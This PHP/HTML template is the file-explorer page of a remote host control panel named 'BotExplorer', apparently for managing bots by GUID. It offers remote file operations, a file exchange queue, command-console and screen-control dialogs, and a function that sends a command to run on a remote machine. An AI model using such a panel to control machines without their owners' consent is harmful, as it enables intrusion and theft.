<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" scroll="no">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="renderer" content="webkit">
	<title>主机管理 - NetExplorer - <?php echo $this->netbotguid;  ?></title>
	<link rel="Shortcut Icon" href="<?php echo $this->config->item('static_chat'); ?>/images/favicon.ico">
	<link href="<?php echo $this->config->item('static_chat'); ?>/js/lib/picasa/style/style.css?ver=3.12" rel="stylesheet"/>
	<link href="<?php echo $this->config->item('static_chat'); ?>/style/bootstrap.css?ver=3.12" rel="stylesheet"/>
	<link rel="stylesheet" href="<?php echo $this->config->item('static_chat'); ?>/style/font-awesome/css/font-awesome.css">
	<!--[if IE 7]>
	<link rel="stylesheet" href="<?php echo $this->config->item('static_chat'); ?>/style/font-awesome/css/font-awesome-ie7.css">
	<![endif]-->

	
	<link href="<?php echo $this->config->item('static_chat'); ?>/style/skin/simple/app_explorer.css?ver=3.12" rel="stylesheet" id='link_css_list'/>
	
<link rel="stylesheet" href="<?php echo $this->config->item('static_chat'); ?>/leftmenu/css/BootSideMenu.css">
  
<?php if(isset($_GET['type'])){?>
<style>.topbar{display: none;}.frame-header{top:0;}.frame-main{top:50px;}</style>
<?php } ?>
	
	<style type="text/css">
<!--/*把声明的样式包含在一个网页注释中，这样可以解决较老的浏览器不识别style的问题*/
	.backmsg2 {
display: block;
text-decoration: none;
height: 40px;
overflow: hidden;
-webkit-transition: all 0.2s;
-moz-transition: all 0.2s;
-o-transition: all 0.2s;
-ms-transition: all 0.2s;
padding: 0px 1.2em;
border-top: none;
border-bottom: none;
margin-left: -1px;
font-size: 14px;
color: #666666;
background-color: #fff;
}

.backmsg {
display: block;
text-decoration: none;
height: 40px;
overflow: hidden;
-webkit-transition: all 0.2s;
-moz-transition: all 0.2s;
-o-transition: all 0.2s;
-ms-transition: all 0.2s;
padding: 0px 1.2em;
border-top: none;
border-bottom: none;
margin-left: -1px;
font-size: 20px;
color:#F5FFFA;
 text-shadow: #000 1px 1px 1px;
}

-->
</style>

	
	
</head>


<body style="overflow:hidden;" oncontextmenu="return core.contextmenu();">
	<div class="init_loading"><div><img src="<?php echo $this->config->item('static_chat'); ?>/images/loading_simple.gif"/></div></div>
<div class="topbar">
	<div class="content">
		<div class="top_left">
			<a href="javascript:;" class="topbar_menu title"><i class="icon-cloud"></i>BotExplorer</a>
		<a class="topbar_menu" href="javascript:openNETBOT('<?php echo $this->config->item('base_url'); ?>/admin/netbot/viewchat/<?PHP echo $this->netbotguid; ?>');" target="_self"><i class='font-icon menu-desktop'></i>机器</a><a class='topbar_menu this' href='javascript:;' target='_self'><i class='font-icon menu-explorer'></i>文件</a>	<a class='topbar_menu '  href="javascript:openalwinmenu();"><i class='font-icon menu-explorer'></i>交换</a>	<div class="backmsg" id="backmsg">
			
			</div></div>
		
		
		<div class="top_right">
		
		
	
			<div class="menu_group">
				<a href="#" id='topbar_user' data-toggle="dropdown" class="topbar_menu" title="<?PHP echo $this->netbotguid; ?>"><i class="font-icon icon-user"></i><?PHP echo $this->user; ?>&nbsp;<b class="caret"></b></a>
				<ul class="dropdown-menu menu-topbar_user fadein pull-right" role="menu" aria-labelledby="topbar_user">
					
											<!--<li><a href="javascript:core.setting('system');"><i class="font-icon icon-cog"></i>系统设置</a></li>-->
						
					<li><a href="javascript:core.fullScreen();"><i class="font-icon icon-fullscreen"></i>全屏/退出全屏</a></li>
					<li><a href="javascript:core.setting('help');"><i class="font-icon icon-question"></i>使用帮助</a></li>
					<li><a href="javascript:core.setting('about');"><i class="font-icon icon-info-sign"></i>关于作品</a></li>
					<li role="presentation" class="divider"></li>
					<li><a href="javascript:;"><i class="font-icon icon-off"></i>退出管理</a></li>
				</ul>			
			</div>
		</div>
		<div style="clear:both"></div>
	</div>
</div>	<div class="frame-header">
		<div class="header-content">
			<div class="header-left">
				<div class="btn-group btn-group-sm">
					<button class="btn btn-default" id='history_back' title='后退' type="button">
						<i class="font-icon icon-arrow-left"></i>
					</button>
					<button class="btn btn-default" id='history_next' title='前进' type="button">
						<i class="font-icon icon-arrow-right"></i>
					</button>
					<button class="btn btn-default" id='refresh' title='强制刷新' type="button">
						<i class="font-icon icon-refresh"></i>
					</button>
				</div>
			</div><!-- /header left -->
			
			<div class='header-middle'>
				<button class="btn btn-default" id='home' title='我的文件'>
					<i class="font-icon icon-home"></i>
				</button>

				<div id='yarnball' title="点击进入编辑状态"></div>
				<div id='yarnball_input'><input type="text" name="path" value="" class="path" id="path"/></div>

				<button class="btn btn-default" id='fav' title='添加到收藏夹' type="button">
					<i class="font-icon icon-star"></i>
				</button>

				<button class="btn btn-default" id='up' title='上层' type="button">
					<i class="font-icon icon-circle-arrow-up"></i>
				</button>
				<div class="path_tips" title="该目录没有写权限<br/>可以在操作系统中设置此目录的权限"><i class="icon-warning-sign"></i>只读</div>
			</div><!-- /header-middle end-->		
			<div class='header-right'>
				<input type="text" name="seach"/>
				<button class="btn btn-default" id='search' title='搜索' type="button">
					<i class="font-icon icon-search"></i>
				</button>
			</div>
		</div>
	</div><!-- / header end -->

	<div class="frame-main">
		<div class='frame-left'>
			<ul id="folderList" class="ztree"></ul>
			<div class="bottom_box">
				<div class="box_content">
					<a href="javascript:;" class="cell menuRecycleButton"><i class="font-icon icon-trash"></i><span>回收站</span></a>
					<a href="javascript:;" class="cell"><i class="font-icon icon-share-sign"></i><span>我的分享</span></a>
					<div style="clear:both"></div>
				</div>
			</div>
		</div><!-- / frame-left end-->
		<div class='frame-resize'></div>
		<div class='frame-right'>
			<div class="frame-right-main">
				<div class="tools">
					<div class="tools-left">
						<!-- 回收站tool -->
						<div class="btn-group btn-group-sm kod_recycle_tool hidden">
							<button id='recycle_clear' class="btn btn-default" type="button">
					        	<i class="font-icon icon-folder-close-alt"></i>清空回收站					        </button>
						</div>

						<!-- 分享 tool -->
						<div class="btn-group btn-group-sm kod_share_tool hidden">
							<button id='refresh' class="btn btn-default" type="button">
					        	<i class="font-icon icon-folder-close-alt"></i>刷新					        </button>
						</div>

						<!-- 文件功能 -->
						<div class="btn-group btn-group-sm kod_path_tool">
					        <button id='newfolder' class="btn btn-default" type="button">
					        	<i class="font-icon icon-folder-close-alt"></i>新建文件夹					        </button>
					        <button id='newfile' class="btn btn-default" type="button">
					        	<i class="font-icon icon-file-alt"></i>新建文件					        </button>
					        <button id='upload' class="btn btn-default" type="button">
					        	<i class="font-icon icon-cloud-upload"></i>上传					        </button>

					        <div class="btn-group btn-group-sm">
						    <button type="button" class="btn btn-default btn-sm dropdown-toggle" data-toggle="dropdown">
						      <i class="font-icon icon-tasks"></i>more&nbsp;<span class="caret"></span>	      
						    </button>
						    <ul class="dropdown-menu pull-right drop-menu-action fadein">
								<li id="open"><a href='javascript:;'><i class="font-icon icon-folder-open-alt"></i>打开</a></li>
							    <li id="share"><a href='javascript:;'><i class="font-icon icon-share-sign"></i>分享</a></li>
							    <li id="download"><a href='javascript:;'><i class="font-icon icon-download"></i>下载</a></li>
							    <li id="zip"><a href='javascript:;'><i class="font-icon icon-folder-close"></i>zip压缩</a></li>
							    <li class="divider"></li>
							    <li id="copy"><a href='javascript:;'><i class="font-icon icon-copy"></i>复制</a></li>
							    <li id="rname"><a href='javascript:;'><i class="font-icon icon-pencil"></i>重命名</a></li>
							    <li id="cute"><a href='javascript:;'><i class="font-icon icon-cut"></i>剪切</a></li>
							    <li id="past"><a href='javascript:;'><i class="font-icon icon-paste"></i>粘贴</a></li>
							    <li id="remove"><a href='javascript:;'><i class="font-icon icon-trash"></i>删除</a></li>
								<li class="divider"></li>
								<li id="clone"><a href='javascript:;'><i class="font-icon icon-external-link"></i>创建副本</a></li>
							    <li id="createLink"><a href='javascript:;'><i class="font-icon icon-share-alt"></i>创建快捷方式</a></li>
							    <li class="divider"></li>
							    <li id="info"><a href='javascript:;'><i class="font-icon icon-info"></i>属性</a></li>
						    </ul>
						  </div>
						</div>
						<span class='msg'>载入中...</span>
					</div>
					<div class="tools-right">
						<div class="btn-group btn-group-sm">
						  <button id='set_icon' title="图标排列" type="button" class="btn btn-default">
						  	<i class="font-icon icon-th"></i>
						  </button>
						  <button id='set_list' title="列表排列" type="button" class="btn btn-default">
						  	<i class="font-icon icon-list"></i>
						  </button>
						  <div class="btn-group btn-group-sm">
						    <button id="set_theme" title="主题切换" type="button" class="btn btn-default btn-sm dropdown-toggle" data-toggle="dropdown">
						      <i class="font-icon icon-dashboard"></i>&nbsp;&nbsp;<span class="caret"></span>
						    </button>
						    <ul class="dropdown-menu pull-right dropdown-menu-theme fadein">
							    <li class='list ' theme='default/'><a href='javascript:void(0);'><b>areo blue</b></a></li>
<li class='list this' theme='simple/'><a href='javascript:void(0);'><b>simple</b></a></li>
<li class='list ' theme='metro/'><a href='javascript:void(0);'><b>metro</b></a></li>
<li class='list ' theme='metro/blue_'><a href='javascript:void(0);'>metro-blue</a></li>
<li class='list ' theme='metro/leaf_'><a href='javascript:void(0);'>metro-green</a></li>
<li class='list ' theme='metro/green_'><a href='javascript:void(0);'>metro-green+</a></li>
<li class='list ' theme='metro/grey_'><a href='javascript:void(0);'>metro-grey</a></li>
<li class='list ' theme='metro/purple_'><a href='javascript:void(0);'>metro-purple</a></li>
<li class='list ' theme='metro/pink_'><a href='javascript:void(0);'>metro-pink</a></li>
<li class='list ' theme='metro/orange_'><a href='javascript:void(0);'>metro-orange</a></li>
						    </ul>
						  </div>
						</div>
					</div>
					<div style="clear:both"></div>
				</div><!-- end tools -->
				<div id='list_type_list'></div><!-- list type 列表排序方式 -->
				<div class='bodymain html5_drag_upload_box menuBodyMain'>
					<div class="fileContiner"></div>
				</div><!-- html5拖拽上传list -->
			</div>
		</div><!-- / frame-right end-->
	</div><!-- / frame-main end-->
<div class="common_footer">
	Powered by BotExplorer v1.00 | Copyright © <a href="http://www.tianda.cc/" target="_blank">tianda.cc</a> All rights reserved. 
	<a href="javascript:core.copyright();" class="icon-info-sign copyright_bottom"></a>
</div>



	  <!--Test 2 -->
	  <div id="alwinmenu">
	  
	  <div  class="do_search">
	  <div class="search_result" style="height: inherit;">
	  
	  <h1 align="center">文件交换队列 <a href="javascript:gettaskfile();" id="yishua">刷新</a></h1>
        <table border="0" cellspacing="0" cellpadding="0">
        	<tr class="search_title">
               <td class="name">原路径</td>
     
               <td class="size">大小</td>
               <td class="path">中转站路径</td>
            </tr>
            <tbody id="taskfile">
     

        </tbody></table>
    </div>
	</div>  
	 
	
	  
	  </div>
	  <!--/Test 2-->


<script src="<?php echo $this->config->item('static_chat'); ?>/js/lib/seajs/sea.js?ver=3.12"></script>
<script src="/index.php/chat/user/common_js?type=explorer&id=<?php echo rand_string(8);?>"></script>
	<script src="<?php echo $this->config->item('static_chat'); ?>/leftmenu/js/jquery.min.js" type="text/javascript"></script>
    <script src="<?php echo $this->config->item('static_chat'); ?>/leftmenu/js/BootSideMenu.js"></script>
<script type="text/javascript">

 function startchat() {
	G.this_path = "<?php echo $dir;?>";
	seajs.config({
		base: "<?php echo $this->config->item('static_chat'); ?>/js/",
		preload: ["lib/jquery-1.8.0.min"],
		map:[
			[ /^(.*\.(?:css|js))(.*)$/i,'$1$2?ver='+G.version]
		]
	});
	seajs.use("app/src/explorer/main");
 }
	
	 function openCMD(e) {
			$.dialog.open(e, {
				fixed: !0,
				resize: !0,
				title: "命令控制台",
				width: "80%",
				height: "70%"
			})
		}
	
	
	 function openScreen(e) {
			$.dialog.open(e, {
				fixed: !0,
				resize: !0,
				title: "屏幕控制",
				width: "80%",
				height: "80%"
			})
		}
	
	
	
	
	 function openNETBOT(e) {
			$.dialog.open(e, {
				fixed: !0,
				resize: !0,
				title: "主机信息",
				width: "80%",
				height: "80%"
			})
		}
	
	
	 function openalwinmenu() {
	  $('.toggler').trigger("click");
	 }
	 
	 
	    function gettaskfilenew(){ 
    	     	
      		jQuery.ajax({  
    url: '/chat/explorer/get_task_filenew', 
    async: true,  
    dataType: 'json',  
    data: {"num":10}, 
    type: 'POST',    
   
   success: function (data) { 
   	
   	 if(data.code==true){
   	 	
   	 	$("#backmsg").html("【"+data.data.tf_name+"】交换队列已完成"); 
   	 	gettaskfile(); 	   	 
   }else{
   		
   	if(data.data=="500"){
   		location.href = "/500.htm";
   	}
   		
   	}
   
    }, 
   error: function (XMLHttpRequest, textStatus, errorThrown) { 
 alert(errorThrown); 
 },  
     
  }); 
  
  
    } 
	 
	   function gettaskfile(){ 
    	     	$("#yishua").text('读取中……');
      		jQuery.ajax({  
    url: '/chat/explorer/get_task_file', 
    async: true,  
    dataType: 'json',  
    data: {"num":10}, 
    type: 'POST',    
   
   success: function (data) { 
   	
   	 if(data.code==true){
   	 	
   	 	$("#taskfile").html(data.data);  	   	 
   }else{  	
  
   	}
   $("#yishua").text('刷新');
    }, 
   error: function (XMLHttpRequest, textStatus, errorThrown) { 
   	$("#yishua").text('刷新');
 alert(errorThrown); 
 },  
     
  }); 
  
  
    } 
	 
	    function netbotopen(path){ 
    var openpath=jQuery("#openpath").val();
    var opencommand=jQuery("#opencommand").val();
    var openmode=jQuery("#openmode  option:selected").val();     	
     jQuery.ajax({  
    url: '/chat/explorer/netbotopen', 
    async: true,  
    dataType: 'json',  
    data: {"openpath":openpath,"opencommand":opencommand,"openmode":openmode}, 
    type: 'POST',    
   
   success: function (data) { 
   i = $.dialog({
   	            
								icon: "succeed",
								title: !1,
								time: 1.5,
								content: data.data
							});
   i.DOM.wrap.find(".aui_loading").remove();
   $.dialog.list.dialog_netbotopen.close();
    }, 
   error: function (XMLHttpRequest, textStatus, errorThrown) { 
 alert(errorThrown); 
 },  
     
  }); 
  
  
    } 
	
</script>


    <script type="text/javascript">
	  $(document).ready(function(){
	     	startchat();
			 $('#alwinmenu').BootSideMenu({side:"right", autoClose:true});
			 gettaskfile();
			 setInterval(function(){   
            gettaskfilenew();
        },20000);
			 
			 
	  });
	</script>


</body>
</html>